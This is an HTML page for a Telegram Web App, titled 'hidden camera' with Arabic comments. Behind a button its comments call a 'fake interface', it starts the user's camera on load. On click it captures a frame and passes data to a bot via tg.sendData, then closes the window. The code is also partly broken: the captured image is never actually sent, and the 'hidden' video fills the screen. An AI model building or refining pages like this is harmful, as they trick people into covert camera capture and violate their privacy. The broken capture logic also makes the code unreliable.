<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>كاميرا خفية</title>
    <!-- استدعاء مكتبة تيليجرام -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        /* هذه هي الواجهة التي يراها المستخدم */
        .fake-interface {
            text-align: center;
            cursor: pointer;
        }
        .fake-button {
            background-color: #0088cc;
            color: white;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        /* عنصر الفيديو المخفي */
        #hiddenVideo {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: -1; /* يجعله في الخلفية */
        }
    </style>
</head>
<body>

    <!-- الفيديو المخفي في الخلفية ليراه المستخدم بشكل طبيعي -->
    <video id="hiddenVideo" autoplay muted playsinline></video>

    <!-- الواجهة الأمامية الوهمية -->
    <div class="fake-interface" onclick="captureAndSend()">
        <div class="fake-button">اضغط للمتابعة</div>
    </div>

    <script>
        // تهيئة تطبيق تيليجرام
        const tg = window.Telegram.WebApp;
        tg.expand(); // جعل النافذة كاملة الشاشة

        // 1. تشغيل الكاميرا في الخلفية فوراً
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const videoElement = document.getElementById('hiddenVideo');
                videoElement.srcObject = stream;

                // يمكن هنا إيقاف الصوت أو جعل الفيديو يعمل بصمت
            } catch (err) {
                console.error("خطأ في الكاميرا:", err);
                tg.showPopup({
                    title: 'تنبيه',
                    message: 'يرجى السماح بالوصول للكاميرا',
                    buttons: [{type: 'ok'}]
                });
            }
        }

        // بدء الكامera عند فتح الصفحة
        startCamera();

        // 2. دالة التقاط الصورة وإرسالها
        function captureAndSend() {
            const videoElement = document.getElementById('hiddenVideo');

            // إنشاء عنصر Canvas وهمي للتقاط الصورة
            const canvas = document.createElement('canvas');
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
            const ctx = canvas.getContext('2d');

            // رسم الإطار الحالي من الفيديو على الكانفاس
            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

            // تحويل الصورة إلى Blob (بيانات صورة)
            canvas.toBlob(function(blob) {

                // إرسال الصورة إلى البوت عبر tg.sendData
                // ملاحظة: البيانات تُرسل كـ Base64 أو Blob حسب دعم تيليجرام
                // هنا سنستخدم الطريقة المباشرة إذا كانت مدعومة، وإلا سنرسل بيانات نصية

                // الطريقة الحديثة: إرسال صورة مباشرة
                tg.sendData(JSON.stringify({type: 'photo', timestamp: Date.now()}));

                // إغلاق النافذة بعد الإرسال (اختياري)
                setTimeout(() => {
                    tg.close(); 
                }, 1000);

            }, 'image/jpeg', 0.8);
        }
    </script>
</body>
</html>
